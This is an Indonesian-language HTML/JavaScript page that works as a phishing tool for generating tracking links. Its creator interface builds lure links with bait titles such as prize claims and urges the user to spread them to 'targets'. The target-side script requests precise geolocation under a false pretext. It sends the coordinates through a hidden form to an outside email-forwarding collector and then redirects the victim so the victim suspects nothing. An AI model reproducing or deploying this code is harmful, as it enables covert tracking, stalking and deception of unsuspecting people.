<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Konten...</title> <!-- Judul default yang tidak mencurigakan -->
    <style>
        /* Desain Neon dan Glitch untuk Tampilan Hacker */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a;
            color: #00ff00; /* Hijau Neon */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }
        .glitch-text {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 2em;
            color: #ff00ff; /* Magenta Neon */
            text-shadow: 0 0 5px #00ff00, 0 0 10px #ff00ff;
            animation: glitch 1.5s infinite alternate;
            opacity: 0.2;
            pointer-events: none;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        .container {
            background-color: #0d0d0d;
            border: 2px solid #00ff00;
            box-shadow: 0 0 20px #00ff00, inset 0 0 10px #00ff00;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            max-width: 600px;
            width: 90%;
            position: relative;
            z-index: 1;
        }
        h1 {
            color: #ff00ff;
            text-shadow: 0 0 8px #00ff00;
            margin-bottom: 20px;
            font-size: 2.5em;
        }
        p {
            margin-bottom: 15px;
            line-height: 1.6;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #00ff00;
            font-weight: bold;
        }
        .input-group input[type="text"] {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #00ff00;
            background-color: #0d0d0d;
            color: #ff00ff;
            border-radius: 5px;
            font-size: 1em;
            box-shadow: inset 0 0 5px #00ff00;
        }
        .input-group input[type="text"]:focus {
            outline: none;
            border-color: #ff00ff;
            box-shadow: inset 0 0 8px #ff00ff;
        }
        button {
            background-color: #00ff00;
            color: #1a1a1a;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: bold;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 0 10px #00ff00;
        }
        button:hover {
            background-color: #00e600;
            box-shadow: 0 0 15px #00ff00;
        }
        #trackingLinkOutput {
            margin-top: 25px;
            padding: 15px;
            background-color: #2a2a2a;
            border: 1px dashed #ff00ff;
            border-radius: 5px;
            color: #00ff00;
            word-break: break-all;
            display: none; /* Hidden by default */
            box-shadow: inset 0 0 5px #ff00ff;
        }
        #trackingLinkOutput a {
            color: #ff00ff;
            text-decoration: none;
        }
        #trackingLinkOutput a:hover {
            text-decoration: underline;
        }
        .status {
            margin-top: 20px;
            font-weight: bold;
            color: #ff00ff;
        }
        .console-output {
            background-color: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 15px;
            margin-top: 20px;
            text-align: left;
            font-family: 'Consolas', 'Monaco', monospace;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
            display: none; /* Hidden by default */
            box-shadow: inset 0 0 5px #00ff00;
        }
        /* Loading spinner for the target page */
        .loader {
            border: 8px solid #333;
            border-top: 8px solid #00ff00;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="glitch-text">ACCESS GRANTED</div>
    <div class="container" id="mainContainer">
        <!-- Content untuk mode pembuat -->
        <div id="creatorContent">
            <h1>üõ†Ô∏è Pembuat Tautan Pelacak S üõ†Ô∏è</h1>
            <p>Selamat datang, users! Di sini, kamu bisa membuat tautan pelacak yang akan membongkar lokasi targetmu begitu mereka membukanya. Sebuah trik kecil yang licik, bukan? Haha! Ini adalah permainan pikiran!</p>

            <div class="input-group">
                <label for="redirectUrl">URL Pengalihan (Wajib - Setelah lokasi didapat):</label>
                <input type="text" id="redirectUrl" placeholder="Contoh: https://situs-asli.com/artikel" value="https://google.com">
            </div>
            <div class="input-group">
                <label for="lureTitle">Judul Halaman Penarik (Untuk Target):</label>
                <input type="text" id="lureTitle" placeholder="Contoh: Klaim Hadiahmu Sekarang!">
            </div>
            <div class="input-group">
                <label for="lureDescription">Deskripsi Halaman Penarik (Untuk Target):</label>
                <input type="text" id="lureDescription" placeholder="Contoh: Kami perlu verifikasi lokasi Anda untuk mengklaim hadiah ini.">
            </div>

            <button id="generateLinkButton">üöÄ Buat Tautan Pelacak Sekarang!</button>

            <div id="trackingLinkOutput" class="console-output">
                <p>Tautan Pelacakmu siap digunakan, users! Sebarkan dan saksikan keajaiban digital terjadi:</p>
                <a href="#" id="generatedLink" target="_blank"></a>
                <textarea id="manualCopyLink" readonly style="width: calc(100% - 20px); height: 60px; margin-top: 10px; background-color: #2a2a2a; color: #00ff00; border: 1px dashed #ff00ff; border-radius: 5px; padding: 10px; resize: vertical;"></textarea>
                <button onclick="copyLink()" style="margin-top: 10px; background-color: #ff00ff; color: #1a1a1a;">Salin Tautan (Otomatis)</button>
                <p style="margin-top: 10px; color: #ff00ff;">Jika tombol gagal, sorot dan salin teks di atas secara manual! üëÜ</p>
            </div>


            <div class="status"></div>
            <div id="consoleLog" class="console-output">
                <h3>Log Sistem:</h3>
                <p>Memulai proses pelacakan...</p>
            </div>
        </div>
        <!-- End of creator content -->

        <!-- Konten untuk mode target (akan ditampilkan jika ada parameter 'r' di URL) -->
        <div id="targetContent" style="display:none;">
            <h1 id="targetTitle">Memuat Konten...</h1>
            <p id="targetDescription">Harap tunggu sebentar, kami sedang memverifikasi lokasi Anda untuk melanjutkan.</p>
            <div class="loader"></div>
            <div class="status"></div>
            <div id="targetConsoleLog" class="console-output">
                <h3>Log Sistem:</h3>
                <p>Memulai proses verifikasi...</p>
            </div>
        </div>
    </div>

    <script>
        // HATI-HATI: Ganti URL webhook ini dengan milikmu! Ini akan menerima data lokasi.
        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com";

        const statusDisplay = document.querySelector(".status");
        let consoleLogDisplay = document.getElementById("consoleLog");
        const redirectUrlInput = document.getElementById("redirectUrl");
        const lureTitleInput = document.getElementById("lureTitle"); // Input baru untuk judul umpan
        const lureDescriptionInput = document.getElementById("lureDescription"); // Input baru untuk deskripsi umpan
        const generateLinkButton = document.getElementById("generateLinkButton");
        const trackingLinkOutputDiv = document.getElementById("trackingLinkOutput");
        const generatedLinkElement = document.getElementById("generatedLink");
        const manualCopyLinkTextarea = document.getElementById("manualCopyLink");

        // Elemen untuk mode target
        const creatorContentDiv = document.getElementById("creatorContent");
        const targetContentDiv = document.getElementById("targetContent");
        const targetTitleElement = document.getElementById("targetTitle");
        const targetDescriptionElement = document.getElementById("targetDescription");
        let targetConsoleLogDisplay; // Akan ditetapkan jika dalam mode target


        function logToConsole(message) {
            // Log ke konsol yang sesuai berdasarkan mode (pembuat atau target)
            const currentLogDisplay = urlParams.has('r') ? targetConsoleLogDisplay : consoleLogDisplay;
            if (currentLogDisplay) {
                currentLogDisplay.style.display = 'block';
                currentLogDisplay.innerHTML += `<p>${new Date().toLocaleTimeString()} &gt;&gt; ${message}</p>`;
                currentLogDisplay.scrollTop = currentLogDisplay.scrollHeight;
            }
        }

        /**
         * Fungsi inti yang berjalan saat korban membuka tautan pelacak.
         * Ini akan mencoba mendapatkan lokasi dan mengirimkannya ke webhook.
         */
        function runTrackingLogic() {
            logToConsole("Mencoba mendapatkan lokasi target...");
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocationAndRedirect, handleError, {
                    enableHighAccuracy: true,
                    timeout: 7000, // Memberi sedikit lebih banyak waktu untuk akurasi
                    maximumAge: 0
                });
            } else {
                statusDisplay.textContent = "Browser target tidak mendukung geolocation.";
                logToConsole("Browser target tidak mendukung geolocation.");
                sendDummySubmissionForRedirect("Browser tidak mendukung geolocation."); // Tetap alihkan
            }
        }

        /**
         * Mengirim data (lokasi asli atau dummy) ke webhook dan kemudian memicu pengalihan oleh Formsubmit.
         */
        function sendLocationAndRedirect(position) {
            const { latitude, longitude } = position.coords;
            const dataFields = {
                lokasi: `https://www.google.com/maps?q=${latitude},${longitude}`,
                waktu: new Date().toString(),
                _subject: "Lokasi Target Terdeteksi oleh S!",
                _template: "table",
                _captcha: "false"
            };

            logToConsole(`Lokasi terdeteksi: Latitude ${latitude}, Longitude ${longitude}. Mengirim data melalui simulasi form...`);
            statusDisplay.textContent = "Mengirim data lokasi...";

            submitToFormsubmit(dataFields);
        }

        /**
         * Menangani error saat mendapatkan lokasi atau ketika geolocation tidak didukung.
         * Akan mengirim submission dummy dan memicu pengalihan.
         */
        function handleError(error) {
            let errorMessage = "Gagal mendapatkan lokasi.";
            if (error.code === error.PERMISSION_DENIED) {
                errorMessage = "Izin lokasi ditolak oleh pengguna.";
            } else if (error.code === error.POSITION_UNAVAILABLE) {
                errorMessage = "Informasi lokasi tidak tersedia.";
            } else if (error.code === error.TIMEOUT) {
                errorMessage = "Permintaan lokasi habis waktu.";
            }

            statusDisplay.textContent = `Gagal mendapatkan lokasi: ${errorMessage}`;
            logToConsole(`Gagal mendapatkan lokasi: ${errorMessage} üö®`);
            sendDummySubmissionForRedirect(errorMessage); // Tetap alihkan
        }

        /**
         * Fungsi untuk mengirim data dummy (misalnya saat geolocation gagal) ke Formsubmit.
         * Tujuannya adalah untuk memicu pengalihan melalui _next.
         */
        function sendDummySubmissionForRedirect(errorMessage = "Gagal mendapatkan lokasi.") {
            const dataFields = {
                lokasi: `Gagal mendapatkan lokasi: ${errorMessage}`,
                waktu: new Date().toString(),
                _subject: "Kegagalan Lokasi Terdeteksi oleh S!",
                _template: "table",
                _captcha: "false"
            };

            logToConsole("Mengirim submission dummy untuk memicu pengalihan Formsubmit.");
            statusDisplay.textContent = "Mengirim data untuk pengalihan...";

            submitToFormsubmit(dataFields);
        }

        /**
         * Fungsi pembantu untuk membuat dan mengirim form ke Formsubmit.
         * Ini akan memastikan semua data dikirim sebagai form POST dan menangani pengalihan _next.
         */
        function submitToFormsubmit(dataFields) {
            const form = document.createElement("form");
            form.method = "POST";
            form.action = webhook;
            form.style.display = "none"; // Sembunyikan formulir agar tidak terlihat oleh target

            Object.entries(dataFields).forEach(([key, value]) => {
                const input = document.createElement("input");
                input.type = "hidden";
                input.name = key;
                input.value = value;
                form.appendChild(input);
            });

            const urlParams = new URLSearchParams(window.location.search);
            const targetRedirectUrl = urlParams.get('r');
            const nextInput = document.createElement("input");
            nextInput.type = "hidden";
            nextInput.name = "_next";
            // Jika ada URL pengalihan 'r', gunakan itu. Jika tidak, alihkan kembali ke halaman pelacak ini (fallback).
            nextInput.value = targetRedirectUrl ? decodeURIComponent(targetRedirectUrl) : (window.location.origin + window.location.pathname);
            form.appendChild(nextInput);

            document.body.appendChild(form); // Tambahkan formulir ke body
            form.submit(); // Kirimkan formulir

            logToConsole("Simulasi form berhasil dikirim ke Formsubmit. Formsubmit akan mengalihkan halaman. üöÄ");
            statusDisplay.textContent = "Data dikirim. Mengalihkan...";
        }


        // --- Logic untuk pengguna (pembuat tautan) ---
        generateLinkButton.addEventListener('click', () => {
            logToConsole("Tombol 'Buat Tautan Pelacak' diklik. Mengolah...");
            const baseUrl = window.location.origin + window.location.pathname;
            const desiredRedirect = redirectUrlInput.value.trim();
            const lureTitle = lureTitleInput.value.trim();
            const lureDescription = lureDescriptionInput.value.trim();
            let generatedTrackingLink = baseUrl;

            // Pastikan URL pengalihan ada, ini wajib untuk skenario tidak mencurigakan
            if (!desiredRedirect) {
                statusDisplay.textContent = "‚ö†Ô∏è URL Pengalihan wajib diisi untuk membuat tautan tidak mencurigakan!";
                logToConsole("URL Pengalihan kosong. Pembuatan tautan dibatalkan.");
                return;
            }

            const encodedRedirect = encodeURIComponent(desiredRedirect);
            let params = `r=${encodedRedirect}`;

            // Tambahkan judul dan deskripsi umpan ke parameter URL
            if (lureTitle) {
                params += `&t=${encodeURIComponent(lureTitle)}`;
            }
            if (lureDescription) {
                params += `&d=${encodeURIComponent(lureDescription)}`;
            }

            generatedTrackingLink += `?${params}`;
            logToConsole(`Membentuk tautan dengan pengalihan ke: ${desiredRedirect} dan umpan dinamis üîó`);

            generatedLinkElement.href = generatedTrackingLink;
            generatedLinkElement.textContent = generatedTrackingLink;
            manualCopyLinkTextarea.value = generatedTrackingLink;
            trackingLinkOutputDiv.style.display = 'block';
            statusDisplay.textContent = "Tautan berhasil dibuat! Salin dan sebarkan. üòà";
            logToConsole("Tautan pelacak berhasil dibuat.");
        });

        /**
         * Menyalin tautan yang dihasilkan ke clipboard.
         */
        function copyLink() {
            const linkText = generatedLinkElement.textContent;
            navigator.clipboard.writeText(linkText).then(() => {
                statusDisplay.textContent = "Tautan pelacak disalin ke clipboard! üéâ";
                logToConsole("Tautan pelacak disalin.");
            }).catch(err => {
                statusDisplay.textContent = "Gagal menyalin tautan otomatis. Silakan salin secara manual dari kotak di atas! üö´";
                logToConsole(`Gagal menyalin tautan otomatis: ${err.message} üö´`);
                manualCopyLinkTextarea.select();
                try {
                    document.execCommand('copy');
                    statusDisplay.textContent = "Tautan disorot. Silakan tekan Ctrl+C / Cmd+C untuk menyalin!";
                    logToConsole("Teks tautan disorot untuk salinan manual.");
                } catch (fallbackErr) {
                    statusDisplay.textContent = "Gagal menyalin dan menyorot tautan. Silakan salin manual dari kotak teks.";
                    logToConsole(`Fallback salinan manual juga gagal: ${fallbackErr.message}`);
                }
            });
        }

        // --- Logika inisialisasi halaman ---
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('r')) {
            // Jika parameter 'r' ada, berarti ini adalah kunjungan tautan pelacak oleh target
            creatorContentDiv.style.display = 'none'; // Sembunyikan antarmuka pembuat
            targetContentDiv.style.display = 'block';  // Tampilkan antarmuka target

            // Dapatkan judul dan deskripsi dari URL, atau gunakan default yang tidak mencurigakan
            const dynamicTitle = urlParams.get('t') ? decodeURIComponent(urlParams.get('t')) : "Memuat Konten Menarik...";
            const dynamicDescription = urlParams.get('d') ? decodeURIComponent(urlParams.get('d')) : "Harap izinkan akses lokasi untuk melanjutkan dan mendapatkan penawaran eksklusif ini.";

            document.title = dynamicTitle; // Ubah judul tab browser
            targetTitleElement.textContent = dynamicTitle;
            targetDescriptionElement.textContent = dynamicDescription;

            // Re-inisialisasi elemen consoleLogDisplay agar mengacu ke consoleLog di targetContent
            targetConsoleLogDisplay = document.getElementById("targetConsoleLog");
            consoleLogDisplay = targetConsoleLogDisplay; // Arahkan logToConsole ke sini

            logToConsole("Mode target aktif. Memuat halaman penarik...");
            runTrackingLogic();
        } else {
            // Jika tidak ada parameter 'r', tampilkan antarmuka pembuatan tautan
            creatorContentDiv.style.display = 'block'; // Tampilkan antarmuka pembuat
            targetContentDiv.style.display = 'none';   // Sembunyikan antarmuka target
            logToConsole("Mode pembuatan tautan diaktifkan. üíª");
        }

        // Log awal saat sistem dimuat
        logToConsole("Sistem S aktif. Menunggu perintah...");
    </script>
</body>
</html>
